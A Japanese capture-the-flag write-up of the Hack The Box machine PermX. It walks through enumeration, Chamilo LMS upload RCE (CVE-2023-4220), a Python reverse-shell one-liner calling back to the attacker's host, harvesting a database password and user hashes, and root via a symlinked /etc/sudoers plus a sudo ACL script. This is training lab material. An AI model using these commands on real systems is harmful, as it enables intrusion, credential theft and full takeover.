
![HTB Banner](https://github.com/hackthebox/writeup-templates/blob/master/machine/assets/images/banner.png?raw=true)


- URL : https://app.hackthebox.com/machines/PermX
- #easy
- OS : #Linux
- Machine Author(s): [mtzsec](https://app.hackthebox.com/users/1573153)
- Hack Date: 2025-01-03,10:29


# Enumeration
使用ツールのオプションが定型化してきてきたのでこの[スクリプト](https://github.com/crum7/HTBScript/blob/main/Enumeration.sh)を使用している
22番と80番が空いてる
http serverはApache/2.4.52 (Ubuntu)と少し古い？
```bash
sudo nmap -vvv -sCV -T4 -p0-65535 --reason 10.129.254.229
...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAyYzjPGuVga97Y5vl5BajgMpjiGqUWp23U2DO9Kij5AhK3lyZFq/rroiDu7zYpMTCkFAk0fICBScfnuLHi6NOI=
|   256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP8A41tX6hHpQeDLNhKf2QuBM7kqwhIBXGZ4jiOsbYCI
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: eLEARNING
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

JQuery3.4.1を使ってる
```bash
[*] whatweb http://permx.htb
http://permx.htb [200 OK] Apache[2.4.52], Bootstrap, Country[RESERVED][ZZ], Email[permx@htb.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.129.254.229], JQuery[3.4.1], Script, Title[eLEARNING]
```

割とリッチなサイト
カーソル当てると、ズームとかする感じ
eLEARNINGという名前のサイト
![](https://raw.githubusercontent.com/crum7/Obsidian/main/HackTheBox_Writeups/Retired/Easy/PermX/images/Pasted%20image%2020250103113531.png)

まず、index.htmlのコメントやソースをざっくり眺める。
サイトで脆弱性の特定で気になったところ
けど、他をまず探ってみる。

<!--/*** This template is free as long as you keep the footer author’s credit link/attribution link/backlink. If you'd like to use the template without the footer author’s credit link/attribution link/backlink, you can purchase the Credit Removal License from "https://htmlcodex.com/credit-removal". Thank you for your support. ***/-->

    <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="lib/wow/wow.min.js"></script>
    <script src="lib/easing/easing.min.js"></script>
    <script src="lib/waypoints/waypoints.min.js"></script>
    <script src="lib/owlcarousel/owl.carousel.min.js"></script>

![](https://raw.githubusercontent.com/crum7/Obsidian/main/HackTheBox_Writeups/Retired/Easy/PermX/images/Pasted%20image%2020250103114230.png)

ここのSend Messageは、本当に送ってるのか。Burp Suiteで見る。
![](https://raw.githubusercontent.com/crum7/Obsidian/main/HackTheBox_Writeups/Retired/Easy/PermX/images/Pasted%20image%2020250103114425.png)
右側のSend Message : 適当にそれぞれを埋めて、Send Messageを押してもBurp Suiteでは送ったメッセージがないから、送られてなさそう？
Get In Touchのところに書いてあった
```text
**お問い合わせ**  
現在、コンタクトフォームは無効になっています。  
AjaxとPHPを使用して、数分で機能するコンタクトフォームを設定できます。ファイルをコピーして貼り付け、少しコードを追加するだけで完了します。  
[今すぐダウンロード](https://htmlcodex.com/contact-form/)
```




## 隠れディレクトリの探索

大半は、普通のだけど、301の部分が気になる。
301の中の1つはこんな感じだった。
[http://permx.htb/lib/]でアクセスできる
![](https://raw.githubusercontent.com/crum7/Obsidian/main/HackTheBox_Writeups/Retired/Easy/PermX/images/Pasted%20image%2020250103115300.png)
```bash
feroxbuster -u http://permx.htb
301      GET        9l       28w      304c http://permx.htb/lib => http://permx.htb/lib/
200      GET        0l        0w        0c http://permx.htb/lib/waypoints/links.php
200      GET     3275l     9533w    85368c http://permx.htb/lib/owlcarousel/owl.carousel.js
200      GET      206l     1251w    90219c http://permx.htb/img/about.jpg
200      GET        3l      148w     8156c http://permx.htb/lib/wow/wow.min.js
200      GET       50l      141w     1303c http://permx.htb/lib/owlcarousel/assets/owl.theme.default.css
200      GET        6l       41w      936c http://permx.htb/lib/owlcarousel/assets/owl.theme.green.min.css
200      GET       41l      273w    28085c http://permx.htb/img/team-2.jpg
200      GET       50l      141w     1301c http://permx.htb/lib/owlcarousel/assets/owl.theme.green.css
200      GET      138l      705w    57467c http://permx.htb/img/cat-1.jpg
200      GET      275l      899w    14753c http://permx.htb/contact.html
301      GET        9l       28w      303c http://permx.htb/js => http://permx.htb/js/
200      GET      109l      205w     2698c http://permx.htb/js/main.js
301      GET        9l       28w      304c http://permx.htb/css => http://permx.htb/css/
200      GET        6l     3782w   164194c http://permx.htb/css/bootstrap.min.css
301      GET        9l       28w      304c http://permx.htb/img => http://permx.htb/img/
200      GET        5l       69w     4677c http://permx.htb/img/testimonial-3.jpg
200      GET        6l       80w     5378c http://permx.htb/img/testimonial-2.jpg
200      GET       94l      537w    57860c http://permx.htb/img/team-3.jpg
200      GET       59l      359w    33963c http://permx.htb/img/team-1.jpg
200      GET      107l      604w    40660c http://permx.htb/img/course-2.jpg
200      GET      112l      581w    45923c http://permx.htb/img/course-3.jpg
200      GET      109l      597w    49102c http://permx.htb/img/team-4.jpg
200      GET      239l     1265w   101629c http://permx.htb/img/carousel-2.jpg
200      GET       11l      188w    16953c http://permx.htb/lib/animate/animate.min.css
200      GET     1579l     2856w    23848c http://permx.htb/lib/animate/animate.css
200      GET        7l      158w     9028c http://permx.htb/lib/waypoints/waypoints.min.js
200      GET       23l      172w     1090c http://permx.htb/lib/owlcarousel/LICENSE
200      GET        7l      279w    42766c http://permx.htb/lib/owlcarousel/owl.carousel.min.js
200      GET      208l      701w    10428c http://permx.htb/404.html
200      GET        1l       38w     2302c http://permx.htb/lib/easing/easing.min.js
200      GET      275l      912w    14806c http://permx.htb/team.html
200      GET        8l       81w     5070c http://permx.htb/img/testimonial-4.jpg
200      GET      238l      922w    13018c http://permx.htb/testimonial.html
200      GET      388l     1519w    22993c http://permx.htb/courses.html
200      GET        6l       64w     2936c http://permx.htb/lib/owlcarousel/assets/owl.carousel.min.css
200      GET      126l      738w    60325c http://permx.htb/img/cat-3.jpg
200      GET      434l      827w     7929c http://permx.htb/css/style.css
200      GET      158l      719w    58188c http://permx.htb/img/cat-4.jpg
200      GET       14l       81w     5311c http://permx.htb/img/testimonial-1.jpg
200      GET      132l      738w    55021c http://permx.htb/img/cat-2.jpg
200      GET       20l      133w     8179c http://permx.htb/lib/owlcarousel/assets/owl.video.play.png
200      GET      170l      431w     4028c http://permx.htb/lib/owlcarousel/assets/owl.carousel.css
200      GET       35l      179w     5340c http://permx.htb/lib/owlcarousel/assets/ajax-loader.gif
200      GET      162l     1097w   114385c http://permx.htb/img/carousel-1.jpg
200      GET      367l     1362w    20542c http://permx.htb/about.html
200      GET       56l      315w    34720c http://permx.htb/img/course-1.jpg
200      GET        6l       41w      936c http://permx.htb/lib/owlcarousel/assets/owl.theme.default.min.css
200      GET      587l     2466w    36182c http://permx.htb/index.html
200      GET      587l     2466w    36182c http://permx.htb/
200      GET      542l     1651w    16517c http://permx.htb/lib/wow/wow.js
200      GET      168l      960w     4092c http://permx.htb/lib/easing/easing.js
[####################] - 7s     30102/30102   0s      found:52      errors:0      
[####################] - 6s     30000/30000   4941/s  http://permx.htb/ 
[####################] - 0s     30000/30000   2500000/s http://permx.htb/lib/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 3s     30000/30000   9381/s  http://permx.htb/lib/waypoints/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 5s     30000/30000   6575/s  http://permx.htb/lib/wow/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 3s     30000/30000   8982/s  http://permx.htb/lib/owlcarousel/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 5s     30000/30000   6563/s  http://permx.htb/lib/easing/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 3s     30000/30000   9446/s  http://permx.htb/lib/animate/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 4s     30000/30000   7614/s  http://permx.htb/lib/owlcarousel/assets/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   4285714/s http://permx.htb/js/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 2s     30000/30000   12788/s http://permx.htb/css/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 2s     30000/30000   12876/s http://permx.htb/img/ => Directory listing (add --scan-dir-listings to scan) 
```


### サブドメインの探索
wwwとlmsが見つかった。
ちなみに、ここにアクセスする前に/etc/hostsに追加するのを忘れるとアクセスできないので、注意
- http://www.permx.htb/
	- [http://permx.htb/]と同じリンク
- http://lms.permx.htb/
	- 以下の写真のようなChamiloのログイン画面に飛ばされる。
	- Chamilo
		- ユーザーがWebベースのオンライン学習アプリを作成できる無料のeラーニングツール
		- 軽量で適応性のあるオープンソースのeラーニングプラットフォーム
		- E-Learningが云々と言っていたwww.permx.htbの生徒とか教員が使用するのかな。
- ![](https://raw.githubusercontent.com/crum7/Obsidian/main/HackTheBox_Writeups/Retired/Easy/PermX/images/Pasted%20image%2020250103120826.png)
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://permx.htb -H "Host: FUZZ.permx.htb" -mc 200
www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 9ms]
lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 1430ms]
```


[http://lms.permx.htb/]の方でも偵察を行う。
LMSってなに？
- Learning Management System
```bash
http://lms.permx.htb [200 OK] Apache[2.4.52], Bootstrap, Chamilo[1], Cookies[GotoCourse,ch_sid], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], HttpOnly[GotoCourse,ch_sid], IP[10.129.254.229], JQuery, MetaGenerator[Chamilo 1], Modernizr, PasswordField[password], PoweredBy[Chamilo], Script, Title[PermX - LMS - Portal], X-Powered-By[Chamilo 1], X-UA-Compatible[IE=edge]
```

できれば、バージョンなど知りたいなあと。
`searchsploit Chamilo`で検索するといくつか出てくるから。

### 隠れディレクトリの探索
サイトで表示された内容
- `http://lms.permx.htb/bin/doctrine.php`
	You are missing a "cli-config.php" or "config/cli-config.php" file in your project, which is required to get the Doctrine Console working. You can use the following sample as a template:
- `http://lms.permx.htb/README.md`
	- Chamilo 1.11.x
```bash
[★]$ sudo dirsearch -u http://lms.permx.htb -t 50 -i 200

Target: http://lms.permx.htb/

[21:27:00] Starting: 
[21:27:00] 200 -   46B  - /.bowerrc
[21:27:01] 200 -    2KB - /.codeclimate.yml
[21:27:02] 200 -    3KB - /.scrutinizer.yml
[21:27:02] 200 -    4KB - /.travis.yml
[21:27:08] 200 -  708B  - /app/
[21:27:08] 200 -  540B  - /app/cache/
[21:27:08] 200 -  101KB - /app/bootstrap.php.cache
[21:27:08] 200 -  407B  - /app/logs/
[21:27:09] 200 -  455B  - /bin/
[21:27:09] 200 -    1KB - /bower.json
[21:27:11] 200 -    7KB - /composer.json
[21:27:11] 200 -  587KB - /composer.lock
[21:27:11] 200 -    5KB - /CONTRIBUTING.md
[21:27:12] 200 -    1KB - /documentation/
[21:27:13] 200 -    2KB - /favicon.ico
[21:27:15] 200 -    4KB - /index.php
[21:27:15] 200 -    4KB - /index.php/login/
[21:27:17] 200 -  842B  - /license.txt
[21:27:17] 200 -   34KB - /LICENSE
[21:27:18] 200 -   97B  - /main/
[21:27:23] 200 -    8KB - /README.md
[21:27:24] 200 -  403B  - /robots.txt
[21:27:26] 200 -  444B  - /src/
[21:27:29] 200 -    0B  - /vendor/composer/autoload_real.php
[21:27:29] 200 -    0B  - /vendor/composer/autoload_psr4.php
[21:27:29] 200 -    0B  - /vendor/composer/autoload_namespaces.php
[21:27:29] 200 -    1KB - /vendor/composer/LICENSE
[21:27:29] 200 -    0B  - /vendor/composer/autoload_static.php
[21:27:29] 200 -    1KB - /vendor/
[21:27:29] 200 -  531KB - /vendor/composer/installed.json
[21:27:29] 200 -    0B  - /vendor/autoload.php
[21:27:29] 200 -    0B  - /vendor/composer/ClassLoader.php
[21:27:29] 200 -    0B  - /vendor/composer/autoload_files.php
[21:27:29] 200 -    0B  - /vendor/composer/autoload_classmap.php
[21:27:30] 200 -    6KB - /web.config
[21:27:30] 200 -  479B  - /web/

Task Completed

```

そういえば、ログインの下に「I lost my password」があるが、こんな表示になって、「Davis Miller」のリンクをクリックするとメールソフトが開いて、`admin@permx.htb`というアカウントに送るようになっている。
![](https://raw.githubusercontent.com/crum7/Obsidian/main/HackTheBox_Writeups/Retired/Easy/PermX/images/Pasted%20image%2020250103124647.png)

バージョンがChamilo 1.11.xであると分かったので、改めて、searchsploitで脆弱性が見つかるか
```bash
└──╼ [★]$ searchsploit Chamilo 1.1
-------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Exploit Title                                            |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------
Chamilo LMS 1.11.14 - Account Takeover                   | php/webapps/50694.txt
Chamilo LMS 1.11.14 - Remote Code Execution (Authenticated)  | php/webapps/49867.py
Chamilo LMS 1.11.8 - 'firstname' Cross-Site Scripting    | php/webapps/45536.txt
Chamilo LMS 1.11.8 - Cross-Site Scripting                | php/webapps/45535.txt
-------------------------------------------------------------------------------------------------------------------------------------------------------------------
Shellcodes: No Results

```
それぞれについて見ていく

XSSを利用したアカウント窃取ぽい
```bash
  Exploit: Chamilo LMS 1.11.14 - Account Takeover
      URL: https://www.exploit-db.com/exploits/50694cd ../
     Path: /usr/share/exploitdb/exploits/php/webapps/50694.txt
    Codes: CVE-2021-37391
 Verified: False
File Type: ASCII text
Copied to: /home/snowyowl644/HTBScript/50694.txt
```

アカウントを持ってる人が使える脆弱性だな
リモートの認証された管理者は、main/inc/lib/fileUpload.lib.php ディレクトリ トラバーサルを介して、任意の PHP コードを含むファイルを特定のディレクトリにアップロードし、PHP コードを実行できます。
```bash
  Exploit: Chamilo LMS 1.11.14 - Remote Code Execution (Authenticated)
      URL: https://www.exploit-db.com/exploits/49867
     Path: /usr/share/exploitdb/exploits/php/webapps/49867.py
    Codes: CVE-2021-31933
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /home/snowyowl644/HTBScript/49867.py
```

Chamilo LMS 1.11.8には、**Firstname**と**Lastname**フィールドの入力検証が不適切なため、新規ユーザー登録時に**永続的なXSS（クロスサイトスクリプティング）攻撃**を実行できる
サインアップできるディレクトリあるかな
```bash
  Exploit: Chamilo LMS 1.11.8 - 'firstname' Cross-Site Scripting
      URL: https://www.exploit-db.com/exploits/45536
     Path: /usr/share/exploitdb/exploits/php/webapps/45536.txt
    Codes: N/A
 Verified: True
File Type: HTML document, ASCII text
Copied to: /home/snowyowl644/HTBScript/45536.txt

```

Chamilo LMS 1.11.8の**カレンダー/個人用アジェンダページ**では、入力検証が不適切なため、新しい会議を追加する際に**会議内容フィールド**を使用して永続的なXSS攻撃を仕掛けることができる。
ログイン後できるって感じだな
```bash
  Exploit: Chamilo LMS 1.11.8 - Cross-Site Scripting
      URL: https://www.exploit-db.com/exploits/45535
     Path: /usr/share/exploitdb/exploits/php/webapps/45535.txt
    Codes: N/A
 Verified: True
File Type: HTML document, ASCII text
Copied to: /home/snowyowl644/HTBScript/45535.txt

```

googleで同様に検索したところ
[https://github.com/charlesgargasson/CVE-2023-4220]が見つかった
Chamilo LMS <= 1.11.24 (Beersel 31/08/2023)
- 攻撃者は認証なしで、任意のコードを実行するPHPスクリプトをアップロード可能。
- サーバー上で任意のシェルコマンドを実行可能。
- 最悪の場合、完全なサーバー制御を取得。


# Foothold
CVE-2023-4220を利用して、poc.shに[github](https://github.com/charlesgargasson/CVE-2023-4220)のREADMEに書いてあるシェルスクリプトを実行してみる。
www-dataとしてログインできたことがわかる。
```bash
┌─[sg-dedivip-1]─[10.10.14.6]─[snowyowl644@htb-umlp2sdxq9]─[~/HTBScript]
└──╼ [★]$ nano poc.sh
┌─[sg-dedivip-1]─[10.10.14.6]─[snowyowl644@htb-umlp2sdxq9]─[~/HTBScript]
└──╼ [★]$ ./poc.sh
bash: ./poc.sh: Permission denied
┌─[sg-dedivip-1]─[10.10.14.6]─[snowyowl644@htb-umlp2sdxq9]─[~/HTBScript]
└──╼ [★]$ chmod +x ./poc.sh
┌─[sg-dedivip-1]─[10.10.14.6]─[snowyowl644@htb-umlp2sdxq9]─[~/HTBScript]
└──╼ [★]$ ./poc.sh
The file has successfully been uploaded.uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

毎回、一つずつコマンドを変えるのはめんどくさいので、リバースシェルで接続する。
[https://www.revshells.com/]でリバースシェルを作る。
自分の場合は、bashではうまくいかないので、pythonでリバースシェルを建てられた
```bash
CMD = python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.6",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

リバースシェルの確立
```bash
└──╼ [★]$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.14.6] from (UNKNOWN) [10.129.254.229] 37162
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ 
```

Apache サーバーの Web 管理者であるwww-dataであることがわかる。cd・home
```bash

```

```bash

```

```bash

```


- **Tactics**:
    - #Tactic_初期アクセス
    - #Tactic_Escution_実行
- **Techniques**:
    - #T1190_公開アプリケーションのエクスプロイト
    - #T1059_コマンドとスクリプトインタープリタ
    - #T1078_有効なアカウント
    - その他のInitial Access/Execution関連技術...




# Lateral Movement
www-dataは、Apacheサーバーの管理者として、/var/wwwは自由にいじれる権限がある。
/var/www以下を色々見ていると、configuration.phpがある。
configuration.phpは、データベースの設定を行なっているphpであり、データベースにログインするためのアカウント情報を取得できる。
ここで取得できたアカウント情報でデータベースにアカウントを追加する。
```bash
www-data@permx:/var/www/chamilo/app/config$ head -30 configuration.php
head -30 configuration.php
<?php
// Chamilo version 1.11.24
// File generated by /install/index.php script - Sat, 20 Jan 2024 18:20:32 +0000
/* For licensing terms, see /license.txt */
/**
 * This file contains a list of variables that can be modified by the campus site's server administrator.
 * Pay attention when changing these variables, some changes may cause Chamilo to stop working.
 * If you changed some settings and want to restore them, please have a look at
 * configuration.dist.php. That file is an exact copy of the config file at install time.
 * Besides the $_configuration, a $_settings array also exists, that
 * contains variables that can be changed and will not break the platform.
 * These optional settings are defined in the database, now
 * (table settings_current).
 */

// Database connection settings.
$_configuration['db_host'] = 'localhost';
$_configuration['db_port'] = '3306';
$_configuration['main_database'] = 'chamilo';
$_configuration['db_user'] = 'chamilo';
$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
// Enable access to database management for platform admins.
$_configuration['db_manager_enabled'] = false;

/**
 * Directory settings.
 */
// URL to the root of your Chamilo installation, e.g.: http://www.mychamilo.com/
$_configuration['root_web'] = 'http://lms.permx.htb/';
// Path to the webroot of system, example: /var/www/
```

データベースにアクセスする。
```bash
$ mysql -h localhost -P 3306 -u chamilo -p chamilo
Enter password: 03F6lY3uXAP2bkW8

MariaDB [chamilo]> USE chamilo;
MariaDB [chamilo]> SELECT * FROM user LIMIT 10;
+----+----------+-----------------------+--------+--------------------------------------------------------------+
| id | username | email                 | status | password                                                     |
+----+----------+-----------------------+--------+--------------------------------------------------------------+
|  1 | admin    | admin@permx.htb       |      1 | $2y$04$1Ddsofn9mOaa9cbPzk0m6euWcainR.ZT2ts96vRCKrN7CGCmmq4ra |
|  2 | anon     | anonymous@example.com |      6 | $2y$04$wyjp2UVTeiD/jF4OdoYDquf4e7OWi6a3sohKRDe80IHAyihX0ujdS |
+----+----------+-----------------------+--------+--------------------------------------------------------------+

```



adminのアカウントのパスワードを書き換えることにする。
まず、何でハッシュ化されているのかわからないので、[https://www.tunnelsup.com/hash-analyzer/]で8種の種類を調べる。
bcryptだったので、[https://bcrypt-generator.com/]でbcryptしたハッシュを使うことにする
![](https://raw.githubusercontent.com/crum7/Obsidian/main/HackTheBox_Writeups/Retired/Easy/PermX/images/Pasted%20image%2020250103150646.png)

ユーザー名/パスワードで新しい、adminアカウントを作る。
newadmin/password

```bash
INSERT INTO user (username, username_canonical, email, email_canonical, password, salt, roles, status, registration_date, active, locked, enabled, expired, credentials_expired)
VALUES (
    'newadmin', 
    'newadmin', 
    'newadmin@example.com', 
    'newadmin@example.com', 
    '$2a$12$R1JrMN6jvOxR6ezlMjS3QOHMLSz82PV3AhJqLfGL1/t2n5KeqlYv2', 
    '', 
    'a:1:{i:0;s:16:"ROLE_SUPER_ADMIN";}', 
    1, 
    NOW(), 
    1,
    0,  -- 'locked' フィールド：0はロックされていないことを意味します
    1,  -- 'enabled' フィールド：1は有効であることを意味します
    0,  -- 'expired' フィールド：0は期限切れでないことを意味します
    0   -- 'credentials_expired' フィールド：0は資格情報が期限切れでないことを意味します
);

```

しかし、これはうまく動かず、一つの答えは、`$_configuration['db_password'] = '03F6lY3uXAP2bkW8';`で得られたパスワードでsshにmtzとしてログインすることだった、
```bash
└──╼ [★]$ ssh mtz@10.129.254.229
The authenticity of host '10.129.254.229 (10.129.254.229)' can't be established.
ED25519 key fingerprint is SHA256:u9/wL+62dkDBqxAG3NyMhz/2FTBJlmVC1Y1bwaNLqGA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.254.229' (ED25519) to the list of known hosts.
mtz@10.129.254.229's password: 

```




# Privilege Escalation
いつもの
```bash
mtz@permx:~$ sudo -l
Matching Defaults entries for mtz on permx:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh

```

何をするshellscriptなんだ？
```bash
mtz@permx:~$ cat /opt/acl.sh
#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
```

rootでないユーザーは編集はできないと
```bash
mtz@permx:~$ ls -la /opt/acl.sh
-rwxr-xr-x 1 root root 419 Jun  5  2024 /opt/acl.sh

```

シンボリックリンクを作成
`/etc/sudoers`ファイルを指すシンボリックリンクを作成します。このリンクは`mtz`ユーザーのホームディレクトリに作られる
```bash
mtz@permx:~$ ln -s /etc/sudoers root

```

`acl.sh`スクリプトを使用して権限を変更
シンボリックリンクで指定したファイルに`mtz`ユーザーが読み取り・書き込み権限を持つように設定
```bash
mtz@permx:~$ sudo /opt/acl.sh mtz rw /home/mtz/root

```

`/etc/sudoers`ファイルを編集
シンボリックリンクを通じて`/etc/sudoers`ファイルに以下の行を追加
`mtz`ユーザーはパスワードなしで任意のコマンドをrootとして実行可能にする
```bash
mtz@permx:~$ echo "mtz ALL=(ALL:ALL) NOPASSWD: ALL" >> /home/mtz/root
```

root権限でシェルを取得
```bash
mtz@permx:~$ sudo bash

```



- **Tactics**:
    - #Tactic_特権昇格
- **Techniques**:
    - #T1068_特権昇格のためのエクスプロイト
    - #T1055_プロセス注入
    - #T1053_スケジュールされたタスク/ジョブ
    - その他のPrivilege Escalation関連技術...




## Notes

- **Tactics**:
    - #Tactic_永続化
    - #Tactic_防御回避
- **Techniques**:
    - #T1098_アカウント操作
    - #T1553_信頼制御の転覆
    - #T1070_ホスト上の痕跡削除
    - その他のPersistence/Defense Evasion関連技術...

<このWriteupで特に重要な点や学んだことを追加で記載するセクション>

## Flags

- **User**: 5775c7bf081875a9a7b1d274866d546f
- **Root**: `<md5>`

### ポイント


- searchsploitで脆弱性検索して、全ての脆弱性が出たと思わずに、googleでも脆弱性を検索する
- 侵入は結局sshから